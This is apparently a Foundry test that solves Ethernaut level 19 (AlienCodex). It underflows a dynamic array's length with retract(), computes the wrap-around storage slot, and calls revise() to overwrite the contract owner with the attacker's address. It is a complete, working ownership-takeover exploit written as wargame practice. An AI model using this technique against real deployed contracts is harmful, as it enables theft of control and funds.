pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface IAlienCodex {
    function owner() external view returns (address);

    function make_contact() external;

    function record() external;

    function retract() external;

    function revise(uint256 i, bytes32 _content) external;
}

contract Ethernaut19 is EthernautTest {
    constructor() EthernautTest(19) {}

    function solve() internal override(EthernautTest) {
        IAlienCodex codex = IAlienCodex(instance);
        console.log(codex.owner());

        codex.make_contact();
        codex.retract(); // overflow length

        int256 codex_data_start = int256(uint256(keccak256(abi.encode(1))));
        uint256 slot = uint256(-codex_data_start);

        codex.revise(slot, bytes32(uint256(uint160(address(this)))));
    }
}
